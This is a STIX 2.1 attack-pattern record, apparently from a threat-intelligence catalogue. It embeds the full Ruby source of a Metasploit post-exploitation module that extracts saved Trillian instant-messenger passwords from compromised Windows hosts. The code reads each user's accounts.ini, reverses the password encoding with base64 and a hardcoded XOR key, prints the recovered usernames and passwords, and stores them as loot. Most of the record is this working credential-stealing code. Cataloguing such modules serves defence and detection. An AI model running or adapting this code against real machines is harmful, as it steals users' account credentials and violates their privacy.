{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a1dee2b8-8b74-4131-81b8-f5f17e8d6292",
    "created": "2024-08-14T16:33:08.251928Z",
    "modified": "2024-08-14T16:33:08.251932Z",
    "name": "Windows Gather Trillian Password Extractor",
    "description": " This module extracts account password from Trillian & Trillian Astra v4.x-5.x instant messenger.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/credentials/trillian.rb",
            "external_id": "trillian.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Registry\n  include Msf::Auxiliary::Report\n  include Msf::Post::Windows::UserProfiles\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Trillian Password Extractor',\n        'Description' => %q{\n          This module extracts account password from Trillian & Trillian Astra\n          v4.x-5.x instant messenger.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Sil3ntDre4m <sil3ntdre4m[at]gmail.com>',\n          'Unknown', # SecurityXploded Team, www.SecurityXploded.com\n        ],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              core_channel_eof\n              core_channel_open\n              core_channel_read\n              core_channel_write\n              stdapi_fs_stat\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  def run\n    grab_user_profiles.each do |user|\n      accounts = user['AppData'] + '\\\\Trillian\\\\users\\\\global\\\\accounts.ini'\n      next if user['AppData'].nil?\n      next if accounts.empty?\n\n      stat = begin\n        session.fs.file.stat(accounts)\n      rescue StandardError\n        nil\n      end\n      next if stat.nil?\n\n      get_ini(accounts)\n    end\n  end\n\n  def get_ini(file)\n    config = client.fs.file.new(file, 'r')\n    parse = config.read\n    ini = Rex::Parser::Ini.from_s(parse)\n\n    if ini == {}\n      print_error('Unable to parse file')\n      return\n    end\n\n    creds = Rex::Text::Table.new(\n      'Header' => 'Trillian versions 4-5 Instant Messenger Credentials',\n      'Indent'\t=> 1,\n      'Columns' =>\n      [\n        'User',\n        'Password'\n      ]\n    )\n\n    ini.each_key do |group|\n      username = ini[group]['Account']\n      epass = ini[group]['Password']\n      next if epass.nil? || (epass == '')\n\n      passwd = decrypt(epass).chop\n      print_good(\"User: #{username}  Password: #{passwd}\")\n      creds << [username, passwd]\n    end\n\n    print_status('Storing data...')\n    path = store_loot(\n      'trillian.user.creds',\n      'text/csv',\n      session,\n      creds.to_csv,\n      'trillian_user_creds.csv',\n      'Trillian Instant Messenger User Credentials'\n    )\n    print_good(\"Trillian Instant Messenger user credentials saved in: #{path}\")\n  rescue ::Exception => e\n    print_error(\"An error has occurred: #{e}\")\n  end\n\n  def decrypt(epass)\n    magicarr = [\n      243, 38, 129, 196, 57, 134, 219, 146, 113, 163, 185, 230, 83,\n      122, 149, 124, 0, 0, 0, 0, 0, 0, 255, 0, 0, 128, 0, 0, 0, 128, 128, 0,\n      255, 0, 0, 0, 128, 0, 128, 0, 128, 128, 0, 0, 0, 128, 255, 0, 128, 0,\n      255, 0, 128, 128, 128, 0, 85, 110, 97, 98, 108, 101, 32, 116, 111, 32,\n      114, 101, 115, 111, 108, 118, 101, 32, 72, 84, 84, 80, 32, 112, 114, 111,\n      120, 0\n    ]\n\n    decpass = Rex::Text.decode_base64(epass)\n    plaintext = [decpass].pack('H*').unpack('C*')\n\n    for i in 0..plaintext.length - 2 do\n      plaintext[i] ^= magicarr[i]\n    end\n\n    return plaintext.pack('C*')\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}